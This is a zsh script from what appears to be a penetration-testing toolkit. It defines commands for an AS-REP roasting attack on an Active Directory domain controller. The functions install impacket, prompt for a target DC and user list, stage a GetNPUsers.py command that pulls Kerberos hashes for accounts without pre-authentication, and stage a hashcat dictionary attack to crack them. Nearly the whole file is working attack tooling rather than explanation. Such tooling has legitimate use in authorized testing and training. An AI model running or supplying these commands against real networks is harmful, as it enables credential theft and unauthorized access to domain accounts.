#!/usr/bin/env zsh

############################################################# 
# nb-ad-asrep
#############################################################
nb-ad-asrep-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-asrep
------------
The nb-ad-asrep namespace contains commands for as-rep roast attack on Active Directory DC server.

Commands
--------
nb-ad-asrep-install        installs dependencies
nb-ad-asrep-brute          hunt for users with kerberoast pre-auth nOT required
nb-ad-asrep-crack          crack the password hash

DOC
}

nb-ad-asrep-install() {
  __info "Running $0..."
  __pkgs impacket
}

nb-ad-asrep-brute() {
  __ask "Did you enumerate users into a userlist file? (y/n)"
  local sh && __askvar sh "ANSWER"

  if [[ $sh == "n" ]]; then
    __err "You need a valid userlist file to perform asrep roasting."
    __info "Use nb-ad-enum-kerbrute-users."
    exit 1
  fi

	__ask "Enter the IP address of the target domain controller"
	nb-vars-set-rhost
  nb-vars-set-domain
	__ask "Enter a users wordlist"
  __askpath ul FILE $HOME/desktop/projects/

	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile $ul | tee $(__domadpath)/GetNPUsers.txt"
}

nb-ad-asrep-crack() {
	__ask "Enter the hash"
	__check-hash
	__ask "Enter a password wordlist"
	nb-vars-set-passlist

  print -z "hashcat -m 18200 -a 0 ${__HASH} ${__PASSLIST} -o $(__domadpath)/hashcat.txt"
}
